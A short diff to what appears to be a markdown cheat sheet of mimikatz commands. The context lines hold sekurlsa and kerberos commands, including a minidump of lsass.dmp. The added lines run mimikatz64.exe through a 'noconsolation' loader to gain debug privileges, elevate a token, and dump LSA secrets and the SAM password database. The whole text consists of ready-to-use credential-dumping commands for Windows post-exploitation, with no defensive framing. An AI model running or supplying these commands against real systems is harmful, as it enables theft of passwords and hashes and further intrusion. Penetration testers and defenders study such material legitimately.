@@ -15,3 +15,13 @@ sekurlsa::ekeys
 sekurlsa::minidump lsass.dmp  
 kerberos::tgt
 ```
+
+
+
+```
+noconsolation /exe/mimikatz64.exe privilege::debug token::elevate lsadump::secrets exit
+
+noconsolation /exe/mimikatz64.exe privilege::debug token::elevate lsadump::sam exit
+
+
+```
